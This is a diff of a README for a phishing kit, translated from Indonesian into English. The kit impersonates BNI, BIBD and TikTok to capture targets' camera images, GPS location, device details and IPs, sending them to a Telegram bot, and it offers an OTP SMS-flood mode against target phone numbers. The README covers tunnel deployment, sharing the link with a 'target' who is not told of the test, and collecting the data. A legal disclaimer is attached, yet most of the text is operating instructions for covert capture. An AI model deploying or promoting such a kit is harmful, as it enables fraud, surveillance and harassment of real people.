@@ -1,91 +1,69 @@
 # METACYTECH Tools
 
-<div align="center">
+Multi-template social engineering awareness & phishing simulation platform.
 
-[![Version](https://img.shields.io/badge/version-2.0.0-blue)]()
-[![Next.js](https://img.shields.io/badge/Next.js-16-black)]()
-[![Python](https://img.shields.io/badge/Python-3.13+-green)]()
-[![License](https://img.shields.io/badge/license-MIT-orange)]()
-
-🚀 **Multi-template social engineering awareness & phishing simulation platform**
-
-</div>
-
----
-
-## 📋 Fitur
+## Features
 
 - **Multi-template system** — BNI, TikTok, BIBD, OTP Flood
 - **One-click deploy** — Build Next.js + Cloudflare Tunnel / ngrok
 - **Auto URL update** — metadataBase otomatis mengikuti tunnel URL
 - **Camera & Location capture** — permission-based data collection
 - **Telegram integration** — real-time data delivery
-- **OTP Flood mode** — multi-brand OTP spam (Paypal, Tinder, Telegram, Flip, Lazada, Netflix, dll)
+- **OTP Flood mode** — multi-brand OTP spam
 - **Cross-platform** — Windows & Termux support
 - **Auto fallback** — ngrok jika Cloudflare Tunnel gagal
-- **Premium terminal UI** — clean animations tanpa emoji
+- **Premium terminal UI** — clean animations, no emoji in terminal output
 
----
+## Requirements
 
-## ⚡ Persyaratan
-
-| Komponen | Minimum |
-|----------|---------|
+| Component | Minimum |
+|-----------|---------|
 | Python | 3.13+ |
 | Node.js | 20.x+ |
 | NPM | 10.x+ |
-| Cloudflared | 2026+ (opsional, auto fallback ke ngrok) |
+| Cloudflared | 2026+ (optional, auto fallback to ngrok) |
 | OS | Windows 10+ / Termux (Android) |
 
 ### Install Cloudflared
 
-**Windows:**
-```bash
-# Download from https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/
-# Install to C:\Program Files (x86)\cloudflared\
-```
+**Windows:** Download from https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/ and install to `C:\Program Files (x86)\cloudflared\`
 
-**Termux:**
-```bash
-pkg install cloudflared -y
-```
+**Termux:** `pkg install cloudflared -y`
 
 ### Setup Telegram Bot
 
-1. Chat [@BotFather](https://t.me/BotFather) di Telegram
-2. Kirim `/newbot` dan ikuti instruksi
-3. Dapatkan **Bot Token** (format: `123456:ABC-DEF...`)
-4. Buat grup, invite bot sebagai admin
-5. Kirim pesan ke grup, lalu ke `https://api.telegram.org/bot<TOKEN>/getUpdates`
-6. Dapatkan **Chat ID** dari response JSON
+1. Chat [@BotFather](https://t.me/BotFather) on Telegram
+2. Send `/newbot` and follow instructions
+3. Get your **Bot Token** (format: `123456:ABC-DEF...`)
+4. Create a group, add bot as admin
+5. Send a message to the group, then visit `https://api.telegram.org/bot<TOKEN>/getUpdates`
+6. Get **Chat ID** from the JSON response
 
-Buat file `.env.local` di root project:
-```env
+Create `.env.local` in project root:
+```
 TELEGRAM_BOT_TOKEN=123456:ABC-DEF...
 TELEGRAM_CHAT_ID=-100123456789
 ```
 
----
+## Usage
 
-## 🚀 Cara Menggunakan
-
-### Jalankan Launcher
+### Run Launcher
 
 **Windows:**
-```bash
+```
 python launcher.py
 ```
-Atau double-click `run.bat`
+Or double-click `run.bat`
 
 **Termux:**
-```bash
+```
 cd ~/metacytech-tools
 python launcher.py
 ```
 
-### Alur Penggunaan
+### Flow
 
-Saat pertama kali run, Anda akan diminta memilih template:
+On first run, select a template:
 
 ```
   Pilih template:
@@ -97,17 +75,17 @@ Saat pertama kali run, Anda akan diminta memilih template:
   Pilih template (1-4):
 ```
 
-Pilih template, lalu sistem akan otomatis:
+The system will then:
 
-1. ✅ Apply template files
-2. ✅ Build Next.js app (Turbopack)
-3. ✅ Start server (port 3000)
-4. ✅ Start Cloudflare Tunnel (fallback ke ngrok jika perlu)
-5. ✅ Update metadataBase dengan tunnel URL
-6. ✅ Rebuild & restart server
-7. ✅ Tampilkan **PUBLIC URL** untuk dibagikan
+1. Apply template files
+2. Build Next.js app (Turbopack)
+3. Start server (port 3000)
+4. Start Cloudflare Tunnel (fallback to ngrok if needed)
+5. Update metadataBase with tunnel URL
+6. Rebuild & restart server
+7. Show **PUBLIC URL** to share
 
-**Output terminal:**
+**Terminal output:**
 ```
   ok  Template: TikTok - Video Share Link
 
@@ -135,8 +113,6 @@ Pilih template, lalu sistem akan otomatis:
 
 ### Main Menu
 
-Setelah sistem running:
-
 ```
   [1]  Mulai Semua
        Build + Server + Cloudflare Tunnel
@@ -149,47 +125,43 @@ Setelah sistem running:
   Pilih menu (1-6):
 ```
 
-### Mendapatkan Data Target
+### Getting Target Data
 
-1. **Bagikan PUBLIC URL** yang tampil di terminal ke target
-2. **Monitor Telegram** — data akan terkirim real-time saat target:
-   - Mengizinkan kamera
-   - Mengizinkan akses lokasi
-3. **Data yang diterima:**
-   - 📷 Foto dari kamera depan & Video
-   - 📍 Lokasi GPS (dengan Google Maps link)
-   - 💻 Device info lengkap (OS, browser, RAM, CPU, baterai)
-   - 🌐 IP address & ISP
-   - 📱 Screen resolution & orientation
+1. Share the **PUBLIC URL** with your target
+2. Monitor Telegram — data is sent in real-time when the target:
+   - Grants camera permission
+   - Grants location access
+3. **Data received:**
+   - Photo from front camera & Video
+   - GPS location (with Google Maps link)
+   - Device info (OS, browser, RAM, CPU, battery)
+   - IP address & ISP
+   - Screen resolution & orientation
 
----
+## Available Templates
 
-## 🧩 Template yang Tersedia
+| # | Template | Description | Mode |
+|---|----------|-------------|------|
+| 1 | BNI | Bank Transfer Verification | Web |
+| 2 | TikTok | Video Share Link (camera + location) | Web |
+| 3 | BIBD | Bank Islam Brunei Darussalam | Web |
+| 4 | OTP Flood | Multi-brand OTP spam (Paypal, Tinder, Telegram, Flip, Lazada, Netflix, etc.) | CLI |
 
-| # | Template | Deskripsi | Mode |
-|---|----------|-----------|------|
-| 1 | **BNI** | Bank Transfer Verification | Web |
-| 2 | **TikTok** | Video Share Link (camera + location) | Web |
-| 3 | **BIBD** | Bank Islam Brunei Darussalam | Web |
-| 4 | **OTP Flood** | Spam OTP multi-brand (Paypal, Tinder, Telegram, Flip, Lazada, Netflix, dll) | CLI |
+## Troubleshooting
 
----
-
-## 🔧 Troubleshooting
-
-### Problem: Cloudflared SSL Certificate Error (Termux)
+### Cloudflared SSL Certificate Error (Termux)
 ```
 failed to request quick Tunnel: tls: failed to verify certificate
 ```
 
-**Solusi:**
-```bash
+**Solution:**
+```
 pkg install ca-certificates openssl-tool -y
 pkg upgrade -y
 ```
 
-Jika masih error, sistem akan **auto-fallback ke ngrok**. Install ngrok:
-```bash
+If still failing, system **auto-fallback to ngrok**. Install ngrok:
+```
 cd ~
 wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip
 unzip ngrok-v3-stable-linux-arm64.zip
@@ -197,117 +169,111 @@ chmod +x ngrok
 mv ngrok $PREFIX/bin/
 ```
 
-### Problem: "Could not get tunnel URL"
+### "Could not get tunnel URL"
 
-**Cek apakah cloudflared/ngrok running:**
-```bash
+Check if cloudflared/ngrok is running:
+```
 ps aux | grep cloudflared
 ps aux | grep ngrok
 ```
 
-**Cek tunnel.log:**
-```bash
+Check tunnel.log:
+```
 cat tunnel.log
 ```
 
-**Manual test cloudflared:**
-```bash
+Manual test cloudflared:
+```
 cloudflared tunnel --url http://localhost:3000
 ```
 
-### Problem: Telegram Bot Tidak Kirim Data
+### Telegram Bot Not Sending Data
 
-**Cek token & chat ID:**
-```bash
+Check token & chat ID:
+```
 cat .env.local
 ```
 
-**Test manual menggunakan curl:**
-```bash
+Manual test with curl:
+```
 curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID>&text=Test"
 ```
 
-### Problem: Next.js Build Error
+### Next.js Build Error
 
-**Clear cache dan rebuild:**
-```bash
+Clear cache and rebuild:
+```
 rm -rf .next node_modules
 npm install
 npm run build
 ```
 
-### Problem: Port 3000 Already in Use
+### Port 3000 Already in Use
 
 **Windows:**
-```bash
+```
 netstat -ano | findstr :3000
 taskkill /PID <PID> /F
 ```
 
 **Termux:**
-```bash
+```
 lsof -i :3000
 kill -9 <PID>
 ```
 
----
+## FAQ
 
-## ❓ FAQ
+**Q: Is this tool legal?**
+A: Yes, for authorized security testing and awareness training with **written consent**. Unauthorized use is **ILLEGAL**.
 
-**Q: Apakah tool ini legal?**
-A: Tool ini legal untuk security testing dengan **izin tertulis** dan awareness training. Penggunaan tanpa izin adalah **ILEGAL** dan dapat dikenai sanksi hukum.
+**Q: Does the target know they are being tested?**
+A: No, unless you inform them afterwards (recommended for ethical testing).
 
-**Q: Apakah target tahu sedang di-test?**
-A: Tidak, kecuali Anda memberitahu setelahnya (recommended untuk ethical testing).
+**Q: Where is data stored?**
+A: Data is sent directly to your Telegram bot. **NOT** stored on our servers.
 
-**Q: Data tersimpan dimana?**
-A: Data dikirim ke Telegram bot Anda. **TIDAK** tersimpan di server kami.
+**Q: Can it run 24/7?**
+A: Free Cloudflare Tunnel does not guarantee 100% uptime. For production, use a VPS + custom domain.
 
-**Q: Bisa running 24/7?**
-A: Cloudflare Tunnel gratis tidak menjamin uptime 100%. Untuk production, gunakan VPS + domain sendiri.
+**Q: Can I create custom templates?**
+A: Yes! Create a new folder in `templates/<name>` with `page.tsx`, `layout.tsx`, and assets in `public/`.
 
-**Q: Bisa custom template?**
-A: Ya! Buat folder baru di `templates/<nama>` dengan `page.tsx`, `layout.tsx`, dan assets di `public/`.
+**Q: Why is build slow on Termux?**
+A: Next.js 16 Turbopack does not support ARM. The system auto-downgrades to Next.js 15 with Webpack (slower but stable).
 
-**Q: Kenapa build lambat di Termux?**
-A: Next.js 16 Turbopack tidak support ARM. Sistem auto-downgrade ke Next.js 15 dengan Webpack (lebih lambat tapi stabil).
+**Q: Why no CAPTCHA?**
+A: CAPTCHA was removed as it was ineffective. The system now uses camera & location permission which looks more professional.
 
-**Q: Kenapa tidak ada CAPTCHA?**
-A: CAPTCHA dihapus karena tidak efektif. Sistem hanya menggunakan camera & location permission yang terlihat profesional.
+**Q: How to use OTP Flood mode?**
+A: Select template [4] OTP Flood, then follow the interactive menu to send OTP to target numbers.
 
-**Q: OTP Flood cara pakainya?**
-A: Pilih template [4] OTP Flood, lalu ikuti menu interaktif untuk mengirim OTP ke nomor target.
+## Legal & Ethics
 
----
+**IMPORTANT — READ THIS!**
 
-## ⚖️ Legal & Ethics
+1. **Written consent REQUIRED** — Always obtain written permission before security testing
+2. **Do Not Misuse** — This tool is for education and authorized testing ONLY
+3. **User Responsibility** — You are fully responsible for how you use this tool
+4. **Applicable Laws** — Illegal use may be subject to:
+   - Indonesia: UU ITE Pasal 30-35
+   - USA: Computer Fraud and Abuse Act
+   - EU: GDPR violations
+   - And other applicable laws
 
-### 🚨 PENTING - BACA INI!
+**Permitted use cases:**
+- Security awareness training with consent
+- Authorized penetration testing with clear scope
+- Red team exercises with contract
+- Educational purposes in controlled environment
 
-1. **Izin Tertulis WAJIB** — Selalu dapatkan izin tertulis sebelum melakukan security testing
-2. **Jangan Menyalahgunakan** — Tool ini untuk edukasi dan authorized testing ONLY
-3. **Tanggung Jawab Pengguna** — Anda bertanggung jawab penuh atas penggunaan tool ini
-4. **Hukum Berlaku** — Penggunaan ilegal dapat dikenai:
-   - UU ITE Pasal 30-35 (Indonesia)
-   - Computer Fraud and Abuse Act (USA)
-   - GDPR violations (EU)
-   - Dan hukum lain yang berlaku
-
-### ✅ Use Cases yang DIIZINKAN:
-- Security awareness training dengan persetujuan
-- Authorized penetration testing dengan scope jelas
-- Red team exercises dengan kontrak
-- Educational purposes di controlled environment
-
-### ❌ Use Cases yang DILARANG:
-- Phishing tanpa izin
+**Prohibited use cases:**
+- Phishing without consent
 - Unauthorized data collection
 - Identity theft
 - Any illegal activity
 
----
-
-## 📁 Struktur Project
+## Project Structure
 
 ```
 metacytech-tools/
@@ -344,45 +310,33 @@ metacytech-tools/
 └── requirements.txt              # Python dependencies
 ```
 
----
+## Contributing
 
-## 🤝 Contributing
-
-Contributions are welcome! Tapi pastikan:
+Contributions are welcome! Please ensure:
 1. Follow ethical guidelines
-2. Test thoroughly di Windows & Termux
-3. Document semua perubahan
-4. Create pull request dengan deskripsi jelas
+2. Test thoroughly on Windows & Termux
+3. Document all changes
+4. Create a pull request with clear description
 
----
+## License
 
-## 📄 License
+MIT License — See [LICENSE](LICENSE) for details
 
-MIT License — Lihat [LICENSE](LICENSE) untuk detail
-
----
-
-## 👤 Author
+## Author
 
 **Iqbal**
 - GitHub: [@iqbalgsr46](https://github.com/iqbalgsr46)
 - Project: [METACYTECH Tools](https://github.com/iqbalgsr46/metacytech-tools)
 
----
+## Acknowledgments
 
-## 🙏 Acknowledgments
-
-- Next.js Team untuk amazing framework
-- Cloudflare untuk free tunnel service
-- Telegram untuk bot API
-- Community untuk feedback & contributions
+- Next.js Team for the amazing framework
+- Cloudflare for free tunnel service
+- Telegram for bot API
+- Community for feedback & contributions
 
 ---
 
-<div align="center">
+**Gunakan dengan bijak dan bertanggung jawab.**
 
-**⚠️ Gunakan dengan bijak dan bertanggung jawab! ⚠️**
-
-Made with ❤️ for Security Research & Awareness
-
-</div>
+Made for Security Research & Awareness.
